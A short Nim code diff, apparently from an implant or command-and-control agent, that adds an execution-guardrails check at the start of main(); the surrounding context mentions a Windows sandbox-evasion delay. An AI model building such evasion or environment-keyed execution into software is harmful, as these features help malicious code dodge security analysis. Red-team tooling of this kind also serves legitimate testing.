@@ -11,6 +11,7 @@ elif defined(service):
 else:
   # Executable build - use standard main entry point
   import agent
+  import utils/guardrails
 
   # Conditional imports for Windows-only features
   when defined(windows):
@@ -57,6 +58,10 @@ else:
 
   # Main entry point
   proc main() =
+    # Check execution guardrails before anything else
+    if not checkGuardrails():
+      return
+
     # Run sandbox evasion delay before anything else
     when defined(windows):
       when defined(sandbox_evasion):
